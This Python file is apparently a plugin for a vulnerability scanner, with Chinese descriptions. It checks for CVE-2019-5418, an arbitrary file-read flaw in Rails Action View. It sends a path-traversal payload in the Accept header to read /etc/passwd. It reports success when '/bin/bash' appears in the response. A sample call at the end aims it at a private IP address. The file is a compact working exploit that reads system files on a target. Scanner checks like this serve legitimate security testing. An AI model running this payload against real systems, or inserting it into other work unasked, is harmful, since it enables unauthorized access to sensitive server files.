#!/usr/bin/env python3

import time
import json
from app.lib.utils.request import request
from app.lib.utils.common import get_useragent

class CVE_2019_5418_BaseVerify:
    def __init__(self, url):
        self.info = {
            'name': 'CVE-2019-5418漏洞可读取任意文件',
            'description': 'CVE-2019-5418漏洞可读取任意文件,影响范围为: Action View <5.2.2.1, <5.1.6.2, <5.0.7.2, <4.2.11.1 and v3',
            'date': '2019-01-04',
            'exptype': 'check',
            'type': 'File Read'
        }
        self.url = url
        if not self.url.startswith("http") and not self.url.startswith("https"):
            self.url = "http://" + self.url
        self.headers = {
            'User-Agent': get_useragent(),
            'Accept': '../../../../../../../../etc/passwd{{'
        }

    def check(self):

        """
        检测是否存在漏洞

        :param:

        :return bool True or False: 是否存在漏洞
        """

        try:
            check_req = request.get(self.url + '/robots', headers = self.headers)
            if check_req.status_code == 200 and '/bin/bash' in check_req.text:
                return True
            else:
                return False
        except Exception as e:
            return False
        finally:
            pass

if  __name__ == "__main__":
    CVE_2019_5418 = CVE_2019_5418_BaseVerify('http://192.168.30.242:3000')
    CVE_2019_5418.check()


